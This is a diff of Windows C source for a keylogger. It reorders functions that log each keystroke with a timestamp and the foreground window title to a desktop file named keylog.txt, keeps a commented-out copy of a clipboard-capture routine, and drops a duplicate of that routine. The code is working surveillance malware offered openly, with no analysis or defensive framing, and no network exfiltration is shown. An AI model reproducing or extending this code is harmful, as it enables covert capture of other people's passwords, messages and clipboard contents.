@@ -4,6 +4,42 @@
 
 #define LOG_FILE "C:\\Users\\jareste\\Desktop\\keylog.txt"
 
+void LogKeystroke(char* keystroke)
+{
+    FILE* file = fopen(LOG_FILE, "a");
+    if (!file) return;
+
+    time_t t = time(NULL);
+    struct tm* tm_info = localtime(&t);
+    char time_str[20];
+    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", tm_info);
+
+    HWND hwnd = GetForegroundWindow();
+    char windowTitle[256];
+    GetWindowText(hwnd, windowTitle, sizeof(windowTitle));
+
+    fprintf(file, "[%s] - '%s': %s\n", time_str, windowTitle, keystroke);
+    fclose(file);
+}
+
+// void LogClipboardContent(void)
+// {
+//     if (OpenClipboard(NULL))
+//     {
+//         HANDLE hData = GetClipboardData(CF_TEXT);
+//         if (hData)
+//         {
+//             char* clipboardText = (char*)GlobalLock(hData);
+//             if (clipboardText)
+//             {
+//                 LogKeystroke(clipboardText);
+//                 GlobalUnlock(hData);
+//             }
+//         }
+//         CloseClipboard();
+//     }
+// }
+
 void LogClipboardContent(void)
 {
     if (OpenClipboard(NULL))
@@ -32,24 +68,6 @@ DWORD WINAPI ClipboardLoggerThread(LPVOID lpParam)
     return 0;
 }
 
-void LogKeystroke(char* keystroke)
-{
-    FILE* file = fopen(LOG_FILE, "a");
-    if (!file) return;
-
-    time_t t = time(NULL);
-    struct tm* tm_info = localtime(&t);
-    char time_str[20];
-    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", tm_info);
-
-    HWND hwnd = GetForegroundWindow();
-    char windowTitle[256];
-    GetWindowText(hwnd, windowTitle, sizeof(windowTitle));
-
-    fprintf(file, "[%s] - '%s': %s\n", time_str, windowTitle, keystroke);
-    fclose(file);
-}
-
 void LogKeyPress(DWORD vkCode)
 {
     HKL keyboardLayout = GetKeyboardLayout(0);
@@ -73,24 +91,6 @@ void LogKeyPress(DWORD vkCode)
     else if (vkCode == VK_SPACE)
     {
         LogKeystroke("[SPACE]");
-    }
-}
-
-void LogClipboardContent(void)
-{
-    if (OpenClipboard(NULL))
-    {
-        HANDLE hData = GetClipboardData(CF_TEXT);
-        if (hData)
-        {
-            char* clipboardText = (char*)GlobalLock(hData);
-            if (clipboardText)
-            {
-                LogKeystroke(clipboardText);
-                GlobalUnlock(hData);
-            }
-        }
-        CloseClipboard();
     }
 }
 
